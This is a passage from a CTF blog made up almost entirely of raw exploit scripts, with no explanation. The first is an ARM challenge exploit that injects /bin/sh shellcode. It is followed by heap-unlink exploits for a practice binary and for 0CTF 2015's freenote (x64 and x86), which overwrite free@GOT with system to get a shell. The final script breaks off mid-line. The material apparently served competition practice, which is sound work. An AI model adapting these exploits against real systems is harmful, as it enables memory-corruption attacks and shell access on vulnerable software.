<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line"># create socket</span><br><span class="line">host = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">2333</span></span><br><span class="line"><span class="built_in">io</span> = zio((host,port))</span><br><span class="line"></span><br><span class="line"># check ID</span><br><span class="line">check_id = <span class="string">'1'</span> * <span class="number">17</span> + <span class="string">'0'</span></span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"Input your ID to check in:\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(check_id)</span><br><span class="line"></span><br><span class="line"># enable cantin</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"choose:\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"3.CanTin\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"Which carriage?\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"># read access code</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"choose:\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'0'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">"Bigtang"</span>)</span><br><span class="line"></span><br><span class="line"># leak access code</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"choose:\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'3'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"want?\n"</span>)</span><br><span class="line">hungry = <span class="number">-235</span></span><br><span class="line"><span class="built_in">io</span>.writeline(str(hungry))</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"choose:\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"># open access code</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"choose:\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"3.CanTin\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"Which carriage?\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'0'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"Access code:"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'\x58'</span>*<span class="number">0x32</span>)</span><br><span class="line"></span><br><span class="line"># shellcode = <span class="string">""</span></span><br><span class="line"># shellcode += <span class="string">"\x01\x60\x8f\xe2"</span> # add r6, pc, #<span class="number">1</span></span><br><span class="line"># shellcode += <span class="string">"\x16\xff\x2f\xe1"</span> # add bx r6</span><br><span class="line"># shellcode += <span class="string">"\x40\x40"</span> # eors r0, r0</span><br><span class="line"># shellcode += <span class="string">"\x78\x44"</span> # add r0, pc</span><br><span class="line"># shellcode += <span class="string">"\x0c\x30"</span> # adds r0, #<span class="number">12</span></span><br><span class="line"># shellcode += <span class="string">"\x49\x40"</span> # eors r1, r1</span><br><span class="line"># shellcode += <span class="string">"\x52\x40"</span> # eors r2, r2</span><br><span class="line"># shellcode += <span class="string">"\x0b\x27"</span> # movs r7, #<span class="number">11</span></span><br><span class="line"># shellcode += <span class="string">"\x01\xdf"</span> # svc <span class="number">1</span></span><br><span class="line"># shellcode += <span class="string">"\x01\x27"</span> # movs r7, #<span class="number">1</span></span><br><span class="line"># shellcode += <span class="string">"\x01\xdf"</span> # svc <span class="number">1</span></span><br><span class="line"># shellcode += <span class="string">"\x2f\x2f"</span> # .short <span class="number">0x2f2f</span></span><br><span class="line"># shellcode += <span class="string">"\x62\x69\x6e\x2f"</span> # .word <span class="number">0x2f6e6962</span></span><br><span class="line"># shellcode += <span class="string">"\x2f\x73"</span> # .short <span class="number">0x732f</span></span><br><span class="line"># shellcode += <span class="string">"\x68"</span> # .byte <span class="number">0x68</span></span><br><span class="line"></span><br><span class="line">shellcode  = <span class="string">""</span></span><br><span class="line">shellcode += <span class="string">"\x01\x30\x8f\xe2"</span></span><br><span class="line">shellcode += <span class="string">"\x13\xff\x2f\xe1"</span></span><br><span class="line">shellcode += <span class="string">"\x78\x46\x08\x30"</span></span><br><span class="line">shellcode += <span class="string">"\x49\x1a\x92\x1a"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\x27\x01\xdf"</span></span><br><span class="line">shellcode += <span class="string">"\x2f\x62\x69\x6e"</span></span><br><span class="line">shellcode += <span class="string">"\x2f\x73\x68"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(shellcode)</span><br><span class="line">#raw_input(<span class="string">"Debug"</span>)</span><br><span class="line">#<span class="built_in">io</span>.writeline(<span class="string">"whoami"</span>)</span><br><span class="line"><span class="built_in">io</span>.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Arm/">Arm</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Practice-2016-heap-unlink" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/02/26/Practice-2016-heap-unlink/" class="article-date">
  	<time datetime="2016-02-26T10:13:14.000Z" itemprop="datePublished">2016-02-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/02/26/Practice-2016-heap-unlink/">Practice-2016-heap-unlink</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/heap">heap</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = zio('./heap')</span></span><br><span class="line">io  = zio((<span class="string">'127.1'</span>,<span class="number">6666</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add_chunk</span><span class="params">(length)</span>:</span></span><br><span class="line">	io.writeline(<span class="string">'1'</span>)</span><br><span class="line">	io.read_until(<span class="string">'Input the size of chunk you want to add:'</span>)</span><br><span class="line">	io.writeline(str(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Set_chunk</span><span class="params">(index,data)</span>:</span></span><br><span class="line">	io.writeline(<span class="string">'2'</span>)</span><br><span class="line">	io.read_until(<span class="string">'Set chunk index:'</span>)</span><br><span class="line">	io.writeline(str(index))</span><br><span class="line">	io.read_until(<span class="string">'Set chunk data:'</span>)</span><br><span class="line">	io.write(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete_chunk</span><span class="params">(index)</span>:</span></span><br><span class="line">	io.writeline(<span class="string">'3'</span>)</span><br><span class="line">	io.read_until(<span class="string">'Delete chunk index:'</span>)</span><br><span class="line">	io.writeline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Print_chunk</span><span class="params">(index)</span>:</span></span><br><span class="line">	io.writeline(<span class="string">'4'</span>)</span><br><span class="line">	io.read_until(<span class="string">'Print chunk index:'</span>)</span><br><span class="line">	io.writeline(str(index))</span><br><span class="line"></span><br><span class="line">Add_chunk(<span class="number">0x80</span>)</span><br><span class="line">Add_chunk(<span class="number">0x80</span>)</span><br><span class="line">Add_chunk(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x8049d60</span></span><br><span class="line">fd  = ptr - <span class="number">0xc</span></span><br><span class="line">bk  = ptr - <span class="number">0x8</span></span><br><span class="line">payload  = <span class="string">''</span></span><br><span class="line">payload += l32(<span class="number">0</span>) + l32(<span class="number">0x89</span>) + l32(fd) + l32(bk) + <span class="string">'A'</span>*(<span class="number">0x80</span><span class="number">-4</span>*<span class="number">4</span>)</span><br><span class="line">payload += l32(<span class="number">0x80</span>) + l32(<span class="number">0x88</span>)</span><br><span class="line">Set_chunk(<span class="number">0</span>, payload)</span><br><span class="line">Set_chunk(<span class="number">2</span>, <span class="string">'/bin/sh'</span>.ljust(<span class="number">0x80</span>,<span class="string">'\0'</span>))</span><br><span class="line">Delete_chunk(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x8049ce8</span></span><br><span class="line">payload  = l32(<span class="number">0</span>)*<span class="number">3</span> + l32(free_got)</span><br><span class="line">Set_chunk(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">Print_chunk(<span class="number">0</span>)</span><br><span class="line">system = l32(io.read(<span class="number">4</span>)) - <span class="number">0xf75afc60</span> + <span class="number">0xf7579190</span></span><br><span class="line">Set_chunk(<span class="number">0</span>, l32(system))</span><br><span class="line"></span><br><span class="line">Delete_chunk(<span class="number">2</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-0CTF-2015-Quals-freenote-x64" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/12/0CTF-2015-Quals-freenote-x64/" class="article-date">
  	<time datetime="2015-12-11T17:43:59.000Z" itemprop="datePublished">2015-12-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/12/0CTF-2015-Quals-freenote-x64/">0CTF-2015-Quals-freenote-x64</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/freenote_x64">freenote_x64</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"><span class="comment">#target = (host,port)</span></span><br><span class="line">target = <span class="string">'./freenote_x64'</span></span><br><span class="line"></span><br><span class="line">io = zio(target,timeout=<span class="number">2333</span>,print_read=COLORED(REPR,<span class="string">"yellow"</span>),print_write=COLORED(REPR,<span class="string">"red"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List_Note</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New_Note</span><span class="params">(note)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Length of new note: '</span>)</span><br><span class="line">    io.writeline(str(len(note)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    io.write(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit_Note</span><span class="params">(num,note)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Note number: '</span>)</span><br><span class="line">    io.writeline(str(num))</span><br><span class="line">    io.read_until(<span class="string">'Length of note: '</span>)</span><br><span class="line">    io.writeline(str(len(note)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    io.writeline(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete_Note</span><span class="params">(num)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Note number: '</span>)</span><br><span class="line">    io.writeline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">io.gdb_hint([<span class="number">0x400b14</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">New_Note(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">New_Note(<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">New_Note(<span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line">New_Note(<span class="string">'d'</span>*<span class="number">0x10</span>)</span><br><span class="line">Delete_Note(<span class="number">0</span>)</span><br><span class="line">Delete_Note(<span class="number">2</span>)</span><br><span class="line">New_Note(<span class="string">'e'</span>*<span class="number">0x8</span>)</span><br><span class="line">New_Note(<span class="string">'f'</span>*<span class="number">0x8</span>)</span><br><span class="line">List_Note()</span><br><span class="line">io.read_until(<span class="string">'e'</span>*<span class="number">0x8</span>)</span><br><span class="line">heap_base = l64(io.read_until(<span class="string">'\n'</span>).strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">io.read_until(<span class="string">'f'</span>*<span class="number">0x8</span>)</span><br><span class="line">libc_base = l64(io.read_until(<span class="string">'\n'</span>).strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">Delete_Note(<span class="number">3</span>)</span><br><span class="line">Delete_Note(<span class="number">2</span>)</span><br><span class="line">Delete_Note(<span class="number">1</span>)</span><br><span class="line">Delete_Note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">system = libc_base + <span class="number">0x7fde9b68f4f0</span> - <span class="number">0x7fde9b9f1678</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x7fde9b7af160</span> - <span class="number">0x7fde9b9f1678</span></span><br><span class="line">heap = heap_base - <span class="number">0x1940</span></span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fd = heap + <span class="number">0x30</span> - <span class="number">0x8</span>*<span class="number">3</span></span><br><span class="line">bk = heap + <span class="number">0x30</span> - <span class="number">0x8</span>*<span class="number">2</span></span><br><span class="line">payload  = <span class="string">''</span></span><br><span class="line">payload += l64(<span class="number">0</span>) + l64(<span class="number">0x81</span>)</span><br><span class="line">payload += l64(fd) + l64(bk)</span><br><span class="line">payload += <span class="string">'A'</span>*(<span class="number">0x80</span><span class="number">-0x20</span>)</span><br><span class="line">payload += l64(<span class="number">0x80</span>) + l64(<span class="number">0x90</span>)</span><br><span class="line">payload += <span class="string">'B'</span>*<span class="number">0x80</span></span><br><span class="line">payload += l64(<span class="number">0</span>) + l64(<span class="number">0x91</span>)</span><br><span class="line"><span class="comment">#payload += 'C'*(0x20)</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">New_Note(payload)</span><br><span class="line">Delete_Note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">payload2  = <span class="string">''</span></span><br><span class="line">payload2 += l64(<span class="number">3</span>)</span><br><span class="line">payload2 += l64(<span class="number">1</span>) + l64(<span class="number">8</span>) + l64(bin_sh)</span><br><span class="line">payload2 += l64(<span class="number">1</span>) + l64(<span class="number">8</span>) + l64(free_got)</span><br><span class="line">payload2 += <span class="string">'C'</span>*(len(payload)-len(payload2))</span><br><span class="line">Edit_Note(<span class="number">0</span>,payload2)</span><br><span class="line"><span class="comment">#List_Note()</span></span><br><span class="line">Edit_Note(<span class="number">1</span>,l64(system))</span><br><span class="line"><span class="comment">#List_Note()</span></span><br><span class="line">Delete_Note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-0CTF-2015-Quals-freenote-x86" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/12/0CTF-2015-Quals-freenote-x86/" class="article-date">
  	<time datetime="2015-12-11T17:43:40.000Z" itemprop="datePublished">2015-12-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/12/0CTF-2015-Quals-freenote-x86/">0CTF-2015-Quals-freenote-x86</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/freenote_x86">freenote_x86</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line">target = (host,port)</span><br><span class="line"><span class="comment">#target = './freenote_x86'</span></span><br><span class="line"></span><br><span class="line">io = zio(target,timeout=<span class="number">2333</span>)<span class="comment">#,print_read=NONE,print_write=NONE)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List_Note</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New_Note</span><span class="params">(note)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Length of new note: '</span>)</span><br><span class="line">    io.writeline(str(len(note)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    io.write(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit_Note</span><span class="params">(num,note)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Note number: '</span>)</span><br><span class="line">    io.writeline(str(num))</span><br><span class="line">    io.read_until(<span class="string">'Length of note: '</span>)</span><br><span class="line">    io.writeline(str(len(note)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    io.writeline(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete_Note</span><span class="params">(num)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Note number: '</span>)</span><br><span class="line">    io.writeline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.gdb_hint([0x08048860])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">New_Note(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">New_Note(<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">New_Note(<span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line">New_Note(<span class="string">'d'</span>*<span class="number">0x10</span>)</span><br><span class="line">Delete_Note(<span class="number">0</span>)</span><br><span class="line">Delete_Note(<span class="number">2</span>)</span><br><span class="line">New_Note(<span class="string">'e'</span>*<span class="number">0x4</span>)</span><br><span class="line">New_Note(<span class="string">'f'</span>*<span class="number">0x4</span>)</span><br><span class="line">List_Note()</span><br><span class="line">io.read_until(<span class="string">'eeee'</span>)</span><br><span class="line">heap_base = l32(io.read(<span class="number">4</span>))</span><br><span class="line">io.read_until(<span class="string">'ffff'</span>)</span><br><span class="line">libc_base = l32(io.read(<span class="number">4</span>))</span><br><span class="line">Delete_Note(<span class="number">3</span>)</span><br><span class="line">Delete_Note(<span class="number">2</span>)</span><br><span class="line">Delete_Note(<span class="number">1</span>)</span><br><span class="line">Delete_Note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">system = libc_base + <span class="number">0xf759a360</span> - <span class="number">0xf7702450</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0xf76b91a9</span> - <span class="number">0xf7702450</span></span><br><span class="line">heap = heap_base - <span class="number">0xd28</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">List_Note()</span><br><span class="line"></span><br><span class="line">fd = heap + <span class="number">0x18</span> - <span class="number">0xc</span></span><br><span class="line">bk = heap + <span class="number">0x18</span> - <span class="number">0x8</span></span><br><span class="line">payload  = <span class="string">''</span></span><br><span class="line">payload += l32(<span class="number">0</span>) + l32(<span class="number">0x81</span>)</span><br><span class="line">payload += l32(fd) + l32(bk)</span><br><span class="line">payload += <span class="string">'A'</span>*(<span class="number">0x80</span><span class="number">-0x10</span>)</span><br><span class="line">payload += l32(<span class="number">0x80</span>) + l32(<span class="number">0x88</span>)</span><br><span class="line">payload += <span class="string">'B'</span>*<span class="number">0x80</span></span><br><span class="line">payload += l32(<span class="number">0</span>) + l32(<span class="number">0x89</span>) <span class="comment">#+ 'C'*0x60</span></span><br><span class="line"><span class="comment">#Exit()</span></span><br><span class="line"></span><br><span class="line">New_Note(payload)</span><br><span class="line">Delete_Note(<span 